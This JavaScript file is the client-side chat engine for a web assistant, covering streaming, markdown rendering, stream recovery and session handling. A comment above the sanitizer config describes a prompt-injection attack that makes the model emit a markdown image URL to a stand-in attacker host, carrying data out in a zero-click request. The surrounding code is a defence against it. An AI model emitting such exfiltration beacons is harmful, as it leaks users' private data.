/**
 * Shared chat engine for the assistant.
 * Used by both the full /assistant/ page and the global drawer.
 *
 * Usage:
 *   var engine = createChatEngine({ streamUrl, csrfToken, ... });
 *   engine.doSend("Hello");
 */

/* global marked, DOMPurify */

// Configure marked.js once (idempotent)
if (typeof marked !== 'undefined') {
    marked.setOptions({ breaks: true, gfm: true });
}

// Mirror of dashboard/templatetags/markdown_filter.py:_APP_PREFIXES /
// _BARE_APP_HREF. During streaming, markdown is rendered client-side by
// marked.js — the server-side filter only runs after the stream ends.
// Apply the same bare-app-path repair here so mid-stream link clicks
// don't hit /assistant/<prefix>/... 404s.
var _APP_PREFIXES = [
    'assets', 'stakeholders', 'legal', 'tasks', 'cashflow', 'notes',
    'healthcare', 'documents', 'emails', 'checklists', 'assistant',
    'settings'
];
var _BARE_APP_HREF = new RegExp(
    '(<a\\s[^>]*?\\bhref=")(' + _APP_PREFIXES.join('|') + ')/',
    'gi'
);

// Recovery after a severed stream: the server finishes a disconnected turn in
// the background (assistant/client.py detached drain), so the client polls
// turn-status until the answer lands instead of treating EOF as success.
var RECOVERY_POLL_MS = 4000;
// Give up polling after this long — matches the server's drain budget order
// of magnitude (Opus max-effort turns can legitimately run many minutes).
var RECOVERY_BUDGET_MS = 15 * 60 * 1000;

// Async title pickup: session titles are generated by a background task
// after the stream's `done` event (server emits `title_pending`). The
// engine polls turn-status briefly after finish() until the title lands.
var TITLE_POLL_MS = 2000;
var TITLE_POLL_MAX_ATTEMPTS = 10;

var SPINNER_SVG = '<svg class="w-4 h-4 animate-spin shrink-0" fill="none" viewBox="0 0 24 24">'
    + '<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/>'
    + '<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>'
    + '</svg>';

function escapeHtml(text) {
    var div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Sanitizer allowlist — MUST mirror the server's nh3 policy in
// dashboard/templatetags/markdown_filter.py (_ALLOWED_TAGS/_ALLOWED_ATTRIBUTES).
// A bare DOMPurify.sanitize() uses the default profile, which keeps <img>,
// <style>, and src/srcset/poster/background — so a prompt injection that made
// the model emit `![x](https://attacker/leak?d=…)` would render an <img> and
// fire a zero-click outbound GET DURING streaming (carrying whatever the model
// put in the URL), before the strict server-side render replaces it on reload.
// Restricting the client sanitizer to the same tag/attr set closes that
// exfil beacon and keeps the streamed and persisted renders consistent.
// (ALLOWED_ATTR is global in DOMPurify, so this is the union of the server's
// per-tag attributes — none of href/title/class/align is an exfil vector, and
// javascript:/data: hrefs are still blocked by DOMPurify's URI policy.)
var _SANITIZE_CONFIG = {
    ALLOWED_TAGS: [
        'p', 'br', 'a', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li',
        'blockquote', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'del'
    ],
    ALLOWED_ATTR: ['href', 'title', 'class', 'align']
};

function renderMarkdown(text) {
    // Order matters: parse → repair hrefs → sanitize. The model can quote
    // hostile email/document HTML, and marked passes raw HTML through — this
    // innerHTML sink is a stored-XSS path without DOMPurify.
    var html = marked.parse(text).replace(_BARE_APP_HREF, '$1/$2/');
    return DOMPurify.sanitize(html, _SANITIZE_CONFIG);
}

// Transient notice for refused/failed actions (409 while a turn is running,
// resend failures, etc.) — non-blocking, so it never wedges automation the
// way alert() would. Lives here (not chat.html) because the drawer renders
// on EVERY page: a busy-guard refusal in the drawer needs this toast where
// chat.html's scripts don't exist.
function showChatNotice(msg) {
    var existing = document.getElementById('chat-notice');
    if (existing) existing.remove();
    var el = document.createElement('div');
    el.id = 'chat-notice';
    el.className = 'fixed bottom-6 left-4 right-4 sm:left-1/2 sm:right-auto '
        + 'sm:-translate-x-1/2 sm:max-w-md z-50 px-4 py-2 '
        + 'bg-gray-800 border border-amber-600/50 rounded-lg shadow-lg '
        + 'text-sm text-amber-300 text-center';
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function() { el.remove(); }, 5000);
}

// Message copy button (used by partials/_message.html, which renders in BOTH
// the full chat page and the drawer — so the handler must live in this
// shared file, not chat.html, or drawer clicks throw ReferenceError).
function copyMessage(btn) {
    var text = btn.getAttribute('data-content');
    function showCheck() {
        var copyIcon = btn.querySelector('.copy-icon');
        var checkIcon = btn.querySelector('.check-icon');
        copyIcon.classList.add('hidden');
        checkIcon.classList.remove('hidden');
        setTimeout(function() {
            copyIcon.classList.remove('hidden');
            checkIcon.classList.add('hidden');
        }, 1500);
    }
    function fallbackCopy() {
        var ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        showCheck();
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(showCheck).catch(fallbackCopy);
    } else {
        fallbackCopy();
    }
}

/**
 * Create a chat engine instance.
 *
 * @param {Object} config
 * @param {string} config.streamUrl       - SSE endpoint URL
 * @param {string} config.csrfToken       - CSRF token
 * @param {Element} config.messageListEl  - message container
 * @param {Element} config.scrollEl       - scrollable parent
 * @param {Element} config.inputEl        - textarea
 * @param {Element} config.sendBtnEl      - send button
 * @param {Element|null} config.emptyStateEl - empty state (nullable)
 * @param {number} config.sessionPk       - session ID
 * @param {string} config.messagesUrl     - URL to fetch rendered messages
 * @param {string} config.turnStatusUrl   - JSON endpoint for turn state (stream recovery)
 * @param {function():string|null} config.getPageContext - returns context string or null
 * @param {function()} config.onFinish    - callback after stream ends
 * @param {function(string)} config.onTitle - callback for title events (nullable)
 * @returns {Object} engine with doSend, loadMessages, refreshMessages, autoScroll, isStreaming
 */
function createChatEngine(config) {
    var streaming = false;
    var collectedText = '';
    var firstToken = true;
    var currentMode = 'fast';  // Sticky per-session: "fast", "think", "max"
    // Direct DOM refs to current stream elements (no IDs needed)
    var currentStreamContent = null;
    var currentStreamTools = null;
    var inactivityTimer = null;
    var endedWithError = false;
    var endedWithTimeout = false;  // watchdog fired (vs. a server-sent error)
    var finished = false;          // guard: finish() may be reached >1 way
    var abortController = null;     // tears down the fetch when we give up
    var sawTerminal = false;       // a done/error SSE event arrived this stream
    var recovering = false;        // polling turn-status after a severed stream
    var recoverTimer = null;
    var recoverDeadline = 0;
    // Turn correlation (Phase 4 Defect B): the AssistantTurn pk for THIS
    // stream, delivered in the user_message SSE event. turn-status returns
    // the session's LATEST turn — without matching ids, recovery after a
    // failed POST matches a PREVIOUS completed turn and reloads history
    // over the just-typed message (silent loss).
    var activeTurnId = null;
    var lastSentText = '';         // restored into the input on resend-failures
    // Async title pickup (title_pending SSE → post-finish turn-status poll)
    var titlePending = false;
    var titlePollTimer = null;
    // Set when this engine is replaced (drawer "new session" rebuilds the
    // engine): a still-in-flight title poll must not write into the DOM the
    // successor now owns.
    var torndown = false;
    // Frame-batched streaming render: token events only append to
    // collectedText; the innerHTML rebuild runs at most once per animation
    // frame (re-parsing the whole accumulated markdown per token was O(n²)
    // and janked long answers).
    var renderRafId = null;

    function autoScroll() {
        config.scrollEl.scrollTop = config.scrollEl.scrollHeight;
    }

    function isNearBottom() {
        var el = config.scrollEl;
        return el.scrollHeight - el.scrollTop - el.clientHeight < 50;
    }

    function gatedAutoScroll() {
        // Follow the stream only while the user is already at (or near) the
        // bottom — scrolling up to read mid-stream must stick.
        if (isNearBottom()) autoScroll();
    }

    function cancelScheduledRender() {
        if (renderRafId !== null) {
            cancelAnimationFrame(renderRafId);
            renderRafId = null;
        }
    }

    function renderCollectedText() {
        renderRafId = null;
        if (!currentStreamContent) return;
        // Capture stickiness BEFORE the render — growing the content changes
        // scrollHeight, which would read as "not at bottom" afterwards.
        var follow = isNearBottom();
        // Same parse → href-repair → DOMPurify pipeline as ever; batching
        // changes WHEN it runs, never what is rendered.
        currentStreamContent.innerHTML = renderMarkdown(collectedText);
        if (follow) autoScroll();
    }

    function scheduleRender() {
        if (renderRafId === null) {
            renderRafId = requestAnimationFrame(renderCollectedText);
        }
    }

    function resetWatchdog() {
        if (inactivityTimer) clearTimeout(inactivityTimer);
        inactivityTimer = setTimeout(function() {
            // 90s of total silence despite the server's 5s heartbeat frames:
            // the connection is dead. The turn survives a disconnect
            // server-side, so enter recovery instead of giving up.
            console.error('Stream inactivity timeout (90s) — entering recovery');
            recover();
        }, 90000);
    }

    function recover() {
        // The stream ended without a terminal done/error event: the
        // CONNECTION died, not the turn. The server finishes a disconnected
        // turn in the background and persists the answer — poll turn-status
        // until it lands, then reload messages.
        if (finished || recovering) return;
        recovering = true;
        if (inactivityTimer) clearTimeout(inactivityTimer);
        // Stop consuming the dead stream (no-op if it already hit EOF).
        if (abortController) abortController.abort();
        // A queued render frame would overwrite the interruption notice.
        cancelScheduledRender();
        if (currentStreamContent) {
            currentStreamContent.innerHTML = '<span class="text-amber-400 flex items-center gap-2">'
                + SPINNER_SVG
                + 'Connection interrupted — the assistant is still working…</span>';
        }
        recoverDeadline = Date.now() + RECOVERY_BUDGET_MS;
        pollTurnStatus();
    }

    function pollTurnStatus() {
        if (finished) return;
        fetch(config.turnStatusUrl)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (finished) return;
                // Correlation gate: only trust the report when it is about
                // THIS stream's turn. activeTurnId === null means the send
                // POST never got as far as creating a turn (proxy 502,
                // network blip) — any turn reported is a previous one, and
                // "completed" would be a false success.
                if (activeTurnId === null || data.turn_id !== activeTurnId) {
                    recoveryFailed('The connection was lost before your message reached the assistant. Please resend it.', false);
                    return;
                }
                if (data.state === 'completed') {
                    if (data.confirm_required) pendingQuickReply = true;
                    // A recovered stream never saw the title_pending/title SSE
                    // events, so pick the async-generated title up from the
                    // status payload — or, if the background task hasn't
                    // landed it yet, let finish() run the normal title poll.
                    if (data.session_title && data.session_title !== 'New Chat') {
                        if (config.onTitle) config.onTitle(data.session_title);
                    } else {
                        titlePending = true;
                    }
                    recovering = false;
                    finish();  // onFinish reloads messages — the answer is saved
                    return;
                }
                if (data.state === 'running') {
                    if (Date.now() > recoverDeadline) {
                        recoveryFailed('The connection was lost and the assistant did not finish in time. Please resend your message.', false);
                        return;
                    }
                    recoverTimer = setTimeout(pollTurnStatus, RECOVERY_POLL_MS);
                    return;
                }
                if (data.state === 'failed') {
                    // The server persisted a specific error message — reload
                    // so it becomes visible.
                    recoveryFailed('The assistant hit an error while finishing. Loading details…', true);
                    return;
                }
                // abandoned / stale / none — the turn will not finish.
                recoveryFailed('The connection was lost and the assistant could not finish. Please resend your message.', false);
            })
            .catch(function() {
                // Network still down — keep trying until the deadline.
                if (finished) return;
                if (Date.now() > recoverDeadline) {
                    recoveryFailed('The connection was lost and the assistant could not finish. Please resend your message.', false);
                    return;
                }
                recoverTimer = setTimeout(pollTurnStatus, RECOVERY_POLL_MS);
            });
    }

    function restoreInputText() {
        // The submit handlers clear the textarea before doSend runs; on a
        // "please resend" failure put the text back so nothing is lost.
        // Skip if the user already typed something new.
        if (config.inputEl && !config.inputEl.value.trim() && lastSentText) {
            config.inputEl.value = lastSentText;
        }
    }

    function recoveryFailed(message, reload) {
        recovering = false;
        endedWithError = true;
        // endedWithTimeout doubles as "reload anyway" in finish(): true when
        // the server persisted something worth showing (failed turns save an
        // error message); false keeps the resend instruction visible.
        endedWithTimeout = !!reload;
        if (!reload) restoreInputText();
        cancelScheduledRender();
        if (currentStreamContent) {
            currentStreamContent.innerHTML = '<span class="text-red-400">' + escapeHtml(message) + '</span>';
        }
        finish();
    }

    function handleEvent(event, data) {
        // A chunk whose read() promise resolved before teardown()/finish()
        // still dispatches here afterwards — abort() can't retract a queued
        // microtask. Without this gate a stray error/title frame from a
        // dead drawer engine writes into the shared input/title nodes the
        // successor engine now owns.
        if (finished) return;
        if (event === 'user_message') {
            // First frame of every stream — records which AssistantTurn this
            // stream belongs to, so recovery polls can be correlated.
            if (data.turn_id) activeTurnId = data.turn_id;
        } else if (event === 'tool_start') {
            // Raw here — the whole label is escapeHtml'd once at the sink below.
            var label = data.name;
            if (data.summary) label += '(' + data.summary + ')';
            var toolEl = document.createElement('div');
            toolEl.className = 'flex items-start gap-2 text-xs text-gray-500 mb-1';
            toolEl.setAttribute('data-tool', data.name);
            toolEl.innerHTML = '<span class="inline-flex items-center gap-1 shrink-0">'
                + '<svg class="w-3 h-3 animate-spin" fill="none" viewBox="0 0 24 24">'
                + '<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/>'
                + '<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>'
                + '</svg>' + escapeHtml(label) + '</span>';
            if (currentStreamTools) currentStreamTools.appendChild(toolEl);
            gatedAutoScroll();
        } else if (event === 'tool_done') {
            if (!currentStreamTools) return;
            var toolEls = currentStreamTools.querySelectorAll('[data-tool]');
            for (var j = toolEls.length - 1; j >= 0; j--) {
                if (toolEls[j].getAttribute('data-tool') === data.name) {
                    var resultText = data.result_summary ? ' \u2014 ' + escapeHtml(data.result_summary) : '';
                    var detailHtml = '';
                    if (data.output) {
                        var outputStr = typeof data.output === 'string' ? data.output : JSON.stringify(data.output, null, 2);
                        detailHtml = '<details class="mt-0.5 ml-4"><summary class="cursor-pointer text-gray-600 hover:text-gray-400">details</summary>'
                            + '<pre class="mt-1 p-2 bg-gray-800 rounded text-xs text-gray-500 font-mono overflow-x-auto max-h-32 overflow-y-auto whitespace-pre-wrap">'
                            + escapeHtml(outputStr) + '</pre></details>';
                    }
                    toolEls[j].innerHTML = '<span class="inline-flex items-center gap-1 shrink-0">'
                        + '<svg class="w-3 h-3 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">'
                        + '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>'
                        + escapeHtml(data.name) + '</span>'
                        + '<span class="text-gray-600">' + resultText + '</span>'
                        + detailHtml;
                    break;
                }
            }
        } else if (event === 'clear') {
            collectedText = '';
            firstToken = true;
            // A queued frame would render the (now empty) collectedText over
            // the spinner injected below — drop it.
            cancelScheduledRender();
            if (currentStreamContent) {
                currentStreamContent.innerHTML = '<span class="text-gray-500 flex items-center gap-2">'
                    + '<svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">'
                    + '<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/>'
                    + '<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>'
                    + '</svg>Thinking...</span>';
            }
        } else if (event === 'token') {
            if (firstToken && currentStreamContent) {
                currentStreamContent.innerHTML = '';
                firstToken = false;
            }
            collectedText += data.text;
            scheduleRender();
        } else if (event === 'title') {
            if (config.onTitle) config.onTitle(data.title);
        } else if (event === 'title_pending') {
            // A background task will save the title after this stream ends —
            // finish() starts a short turn-status poll to pick it up.
            titlePending = true;
        } else if (event === 'confirm_required') {
            pendingQuickReply = true;
        } else if (event === 'thinking') {
            // Extended thinking keepalive — reset watchdog and show deep-thinking indicator
            resetWatchdog();
            if (currentStreamContent && firstToken) {
                currentStreamContent.innerHTML = '<span class="text-gray-500 flex items-center gap-2">'
                    + '<svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">'
                    + '<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/>'
                    + '<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>'
                    + '</svg>Thinking deeply\u2026</span>';
            }
        } else if (event === 'done') {
            sawTerminal = true;
        } else if (event === 'error') {
            sawTerminal = true;
            endedWithError = true;
            // A queued frame would render collectedText over the error text
            // injected below — drop it.
            cancelScheduledRender();
            // The submit handler cleared the textarea before doSend ran; a
            // server-sent error (busy guard, API failure) means the message
            // needs resending — put the text back so it isn't lost. Guarded:
            // restoreInputText never clobbers newer typing.
            restoreInputText();
            if (currentStreamContent) {
                currentStreamContent.innerHTML = '<span class="text-red-400">' + escapeHtml(data.message) + '</span>';
            }
        }
    }

    // Pending quick-reply state: set during finish, injected after refresh
    var pendingQuickReply = false;

    function _injectQuickReplyButtons() {
        // Find the last assistant message bubble and append buttons after it
        var bubbles = config.messageListEl.querySelectorAll('.bg-gray-700');
        if (bubbles.length === 0) return;
        var lastBubble = bubbles[bubbles.length - 1];

        var btnContainer = document.createElement('div');
        btnContainer.className = 'flex gap-2 mt-2 quick-reply-buttons';
        btnContainer.innerHTML =
            '<button class="px-3 py-1 bg-green-600 hover:bg-green-500 text-white text-xs font-medium rounded-md transition-colors">Confirm</button>' +
            '<button class="px-3 py-1 bg-gray-600 hover:bg-gray-500 text-white text-xs font-medium rounded-md transition-colors">Deny</button>';
        lastBubble.parentNode.after(btnContainer);

        btnContainer.querySelectorAll('button').forEach(function(btn) {
            btn.addEventListener('click', function() {
                var reply = btn.textContent.toLowerCase();
                config.inputEl.value = reply;
                config.inputEl.focus();
                document.querySelectorAll('.quick-reply-buttons').forEach(function(el) { el.remove(); });
                // _synthetic: chat.html's submit handler must not glue
                // staged-but-unsent attachments onto a programmatic
                // confirm/deny (they belong to the user's NEXT message).
                var ev = new Event('submit', {cancelable: true});
                ev._synthetic = true;
                config.inputEl.form.dispatchEvent(ev);
            });
        });
    }

    function pollSessionTitle(attempt) {
        titlePollTimer = null;
        fetch(config.turnStatusUrl)
            .then(function(r) {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.json();
            })
            .then(function(data) {
                // A drawer "new session" can replace this engine while a poll
                // is in flight; without this guard the resolving fetch would
                // write the OLD session's title into the NEW session's title
                // element (shared #drawer-session-title node).
                if (torndown) return;
                if (data.session_title && data.session_title !== 'New Chat') {
                    if (config.onTitle) config.onTitle(data.session_title);
                    return;
                }
                if (attempt < TITLE_POLL_MAX_ATTEMPTS) {
                    titlePollTimer = setTimeout(function() {
                        pollSessionTitle(attempt + 1);
                    }, TITLE_POLL_MS);
                }
                // Poll budget exhausted: give up quietly — the title lands
                // in the sidebar on the next natural refresh.
            })
            .catch(function() { /* transient — the title is cosmetic */ });
    }

    function finish() {
        // May be reached from the watchdog, the read() loop's done branch, its
        // catch, or the fetch catch — run the teardown only once per stream.
        if (finished) return;
        finished = true;
        if (inactivityTimer) clearTimeout(inactivityTimer);
        if (recoverTimer) clearTimeout(recoverTimer);
        recovering = false;
        streaming = false;
        config.sendBtnEl.disabled = false;
        config.sendBtnEl.textContent = 'Send';

        // pendingQuickReply is set by the confirm_required SSE event
        // (emitted by the backend after dry_run tool calls)

        // Tokens that arrived within the last frame interval may still be
        // waiting on a queued render — paint them now, before the refs are
        // dropped, so the bubble isn't missing its tail until the reload.
        if (renderRafId !== null && !endedWithError) {
            cancelScheduledRender();
            renderCollectedText();
        }
        cancelScheduledRender();

        currentStreamContent = null;
        currentStreamTools = null;
        // The 300ms delay predates the turn-status/recovery work and is
        // vestigial: every path that reaches here with something to show has
        // already persisted it (done carries the saved message_id; recovery
        // paths confirm a terminal turn state). Kept as a small settle delay
        // only because reload timing is not worth destabilizing (Phase 6).
        if (config.onFinish && (!endedWithError || endedWithTimeout)) {
            setTimeout(function() { config.onFinish(); }, 300);
        }

        // Async title pickup: the title task runs in the background after
        // done, so poll turn-status briefly until the saved title appears.
        if (titlePending && !endedWithError) {
            titlePending = false;
            titlePollTimer = setTimeout(function() { pollSessionTitle(1); }, TITLE_POLL_MS);
        }
    }

    function doSend(text) {
        // In-flight guard (Phase 5 Defect B): a second send while a stream is
        // active would reset this closure's shared state and garble both
        // streams. Guarding here covers EVERY entry point — Enter-dispatched
        // submits, retry/edit resubmits, quick-reply buttons — not just the
        // disabled send button.
        if (streaming) return;
        endedWithError = false;
        endedWithTimeout = false;
        finished = false;
        sawTerminal = false;
        recovering = false;
        activeTurnId = null;
        lastSentText = text;
        titlePending = false;
        if (recoverTimer) clearTimeout(recoverTimer);
        if (titlePollTimer) { clearTimeout(titlePollTimer); titlePollTimer = null; }
        cancelScheduledRender();
        // Prepend page context if available
        var context = config.getPageContext ? config.getPageContext() : null;
        var fullText = text;
        if (context) {
            fullText = '[Context: ' + context + ']\n' + text;
        }

        // Display text strips context prefix
        var displayText = text;

        streaming = true;
        config.sendBtnEl.disabled = true;
        config.sendBtnEl.textContent = '...';

        // Remove any quick-reply buttons from previous messages
        document.querySelectorAll('.quick-reply-buttons').forEach(function(el) { el.remove(); });

        // Hide empty state
        if (config.emptyStateEl) config.emptyStateEl.style.display = 'none';

        // Add user message bubble
        var userBubble = document.createElement('div');
        userBubble.className = 'flex justify-end';
        userBubble.innerHTML = '<div class="max-w-[85%] sm:max-w-[70%]">'
            + '<div class="bg-blue-600/20 border border-blue-600/30 rounded-lg px-4 py-2">'
            + '<p class="text-sm text-gray-200 whitespace-pre-wrap">' + escapeHtml(displayText) + '</p>'
            + '</div></div>';
        config.messageListEl.appendChild(userBubble);

        // Add assistant bubble placeholder
        var assistantBubble = document.createElement('div');
        assistantBubble.innerHTML = '<div class="overflow-hidden">'
            + '<div class="engine-stream-tools text-xs text-gray-500 mb-1"></div>'
            + '<div class="bg-gray-700 rounded-lg px-4 py-2">'
            + '<div class="engine-stream-content prose-markdown text-sm text-gray-300 break-words"></div>'
            + '</div></div>';
        config.messageListEl.appendChild(assistantBubble);

        // Store direct refs (no IDs — safe for multiple engines)
        currentStreamContent = assistantBubble.querySelector('.engine-stream-content');
        currentStreamTools = assistantBubble.querySelector('.engine-stream-tools');
        currentStreamContent.innerHTML = '<span class="text-gray-500 flex items-center gap-2">'
            + '<svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">'
            + '<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/>'
            + '<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>'
            + '</svg>Thinking...</span>';
        autoScroll();

        // Reset state for this stream
        collectedText = '';
        firstToken = true;

        // Start SSE stream
        var body = new FormData();
        body.append('message', fullText);
        body.append('mode', currentMode);
        // A throwing config callback here would leave streaming=true with no
        // finish() ever scheduled — and the doSend guard would then brick
        // every future send until reload (getDrawerEffort reads
        // localStorage, which throws when site data is blocked).
        var eff = '';
        try {
            eff = config.getEffort ? config.getEffort(currentMode) : '';
        } catch (effErr) {
            console.error('getEffort failed; sending without effort:', effErr);
        }
        if (eff) body.append('effort', eff);
        resetWatchdog();

        abortController = new AbortController();
        fetch(config.streamUrl, {
            method: 'POST',
            headers: {'X-CSRFToken': config.csrfToken},
            body: body,
            signal: abortController.signal,
        }).then(function(resp) {
            // A non-2xx response (403 CSRF, 500, proxy 502) has an HTML
            // body, not SSE — reading it as a stream parses zero events and
            // EOFs into recover(), which used to read as a false success.
            // Route it to the error path instead (Phase 4 Defect B).
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            var reader = resp.body.getReader();
            var decoder = new TextDecoder();
            var buffer = '';
            // Like buffer, the pending event name must survive a chunk
            // boundary: a frame's "event:" line can arrive in one network
            // chunk and its "data:" line in the next.
            var currentEvent = '';

            function read() {
                reader.read().then(function(result) {
                    if (result.done) {
                        // EOF without a terminal done/error event means the
                        // stream was SEVERED (proxy abort, network drop) —
                        // not a finished turn. Recover instead of silently
                        // treating it as success.
                        if (sawTerminal) { finish(); } else { recover(); }
                        return;
                    }
                    resetWatchdog();
                    buffer += decoder.decode(result.value, {stream: true});
                    var lines = buffer.split('\n');
                    buffer = lines.pop();

                    for (var i = 0; i < lines.length; i++) {
                        var line = lines[i];
                        if (line.startsWith('event: ')) {
                            currentEvent = line.substring(7);
                        } else if (line.startsWith('data: ')) {
                            // One malformed data line must not abort the
                            // whole read loop (and discard every remaining
                            // event in this chunk) — skip just that line.
                            var eventData = null;
                            try {
                                eventData = JSON.parse(line.substring(6));
                            } catch (parseErr) {
                                console.error('Skipping malformed SSE data line:', parseErr);
                                currentEvent = '';
                                continue;
                            }
                            handleEvent(currentEvent, eventData);
                            currentEvent = '';
                        }
                    }
                    read();
                }).catch(function(err) {
                    // AbortError = we intentionally tore down the stream
                    // (watchdog → recover()); recovery is already running.
                    if (err && err.name === 'AbortError') return;
                    console.error('Stream error:', err);
                    if (sawTerminal) { finish(); } else { recover(); }
                });
            }

            read();
        }).catch(function(err) {
            // AbortError = intentional teardown; recovery (or finish) already
            // handled the UI — don't tear down a recovery in progress.
            if (err && err.name === 'AbortError') { if (!recovering) finish(); return; }
            // Request-level failure (network error, or the !resp.ok throw
            // above): no turn was confirmed, so preserve the typed text and
            // end the stream terminally. finish() also disarms the
            // watchdog — leaving it armed used to fire recover() 90s later
            // and reload history over the message.
            console.error('Stream request failed:', err);
            endedWithError = true;
            if (currentStreamContent) {
                currentStreamContent.innerHTML = '<span class="text-red-400">Connection error: '
                    + escapeHtml(err.message) + '. Your message was not processed — please resend it.</span>';
            }
            restoreInputText();
            finish();
        });
    }

    function loadMessages() {
        return fetch(config.messagesUrl, {
            headers: {'HX-Request': 'true'}
        }).then(function(r) {
            // A 500 here used to inject the Django error page into the
            // message list — on any failure leave the DOM untouched.
            if (!r.ok) throw new Error('HTTP ' + r.status);
            return r.text();
        })
        .then(function(html) {
            config.messageListEl.innerHTML = html;
            // Inject quick-reply buttons after refresh if pending
            if (pendingQuickReply) {
                pendingQuickReply = false;
                _injectQuickReplyButtons();
            }
            if (config.emptyStateEl) {
                config.emptyStateEl.style.display = config.messageListEl.innerHTML.trim() ? 'none' : '';
            }
            autoScroll();
        })
        .catch(function(err) {
            console.error('Failed to load messages:', err);
        });
    }

    function refreshMessages() {
        return loadMessages();
    }

    function resumeIfRunning() {
        // Boot-time recovery: a hard navigation (reload, back/forward) mid-
        // turn destroys the engine that was streaming, but the server
        // finishes the detached turn and persists the answer. Without this
        // probe the reloaded page shows the user's message with no reply, no
        // indicator, and never updates — the recovery machinery only engaged
        // for the engine instance that started the stream. One turn-status
        // fetch on init: if a live turn is running, adopt it and enter the
        // same polling recovery a severed stream uses.
        fetch(config.turnStatusUrl)
            .then(function(r) {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.json();
            })
            .then(function(data) {
                if (finished || streaming || recovering) return;
                if (data.state !== 'running' || !data.turn_id) return;
                activeTurnId = data.turn_id;
                streaming = true;
                config.sendBtnEl.disabled = true;
                config.sendBtnEl.textContent = '...';
                if (config.emptyStateEl) config.emptyStateEl.style.display = 'none';
                // Same placeholder structure doSend builds, with the
                // recovery message recover() shows.
                var assistantBubble = document.createElement('div');
                assistantBubble.innerHTML = '<div class="overflow-hidden">'
                    + '<div class="engine-stream-tools text-xs text-gray-500 mb-1"></div>'
                    + '<div class="bg-gray-700 rounded-lg px-4 py-2">'
                    + '<div class="engine-stream-content prose-markdown text-sm text-gray-300 break-words"></div>'
                    + '</div></div>';
                config.messageListEl.appendChild(assistantBubble);
                currentStreamContent = assistantBubble.querySelector('.engine-stream-content');
                currentStreamTools = assistantBubble.querySelector('.engine-stream-tools');
                currentStreamContent.innerHTML = '<span class="text-amber-400 flex items-center gap-2">'
                    + SPINNER_SVG
                    + 'The assistant is still working on your last message…</span>';
                autoScroll();
                recovering = true;
                recoverDeadline = Date.now() + RECOVERY_BUDGET_MS;
                recoverTimer = setTimeout(pollTurnStatus, RECOVERY_POLL_MS);
            })
            .catch(function() { /* best-effort probe — a failure just skips resume */ });
    }

    function teardown() {
        // Called before an engine is discarded (drawer session swap) so its
        // async work can't touch the SUCCESSOR engine's DOM/shared inputs.
        // Mark finished FIRST: every surviving path — finish(), recover(),
        // pollTurnStatus() (both its .then and .catch), and the read loop's
        // finish()/recover() calls — already short-circuits on `finished`, so
        // this single flag neutralizes all of them. Then abort the in-flight
        // SSE fetch so the reader stops (its AbortError branch no-ops), stop
        // the title poll, drop any queued render frame, and clear timers.
        // Without this, clicking drawer "New chat" mid-stream left engine A
        // alive to complete and wipe session B's streaming bubble.
        torndown = true;
        finished = true;
        if (abortController) abortController.abort();
        if (titlePollTimer) { clearTimeout(titlePollTimer); titlePollTimer = null; }
        cancelScheduledRender();
        if (inactivityTimer) { clearTimeout(inactivityTimer); inactivityTimer = null; }
        if (recoverTimer) { clearTimeout(recoverTimer); recoverTimer = null; }
        // Reset the shared send-button state doSend set: finish() will never
        // run on this engine, and the successor engine wraps the SAME button
        // node — without this a mid-stream swap left it stuck on '...'
        // (disabled), soft-locking the drawer until reload.
        streaming = false;
        if (config.sendBtnEl) {
            config.sendBtnEl.disabled = false;
            config.sendBtnEl.textContent = 'Send';
        }
    }

    return {
        doSend: doSend,
        loadMessages: loadMessages,
        refreshMessages: refreshMessages,
        autoScroll: autoScroll,
        isStreaming: function() { return streaming; },
        setMode: function(m) { currentMode = m; },
        getMode: function() { return currentMode; },
        resumeIfRunning: resumeIfRunning,
        teardown: teardown,
    };
}
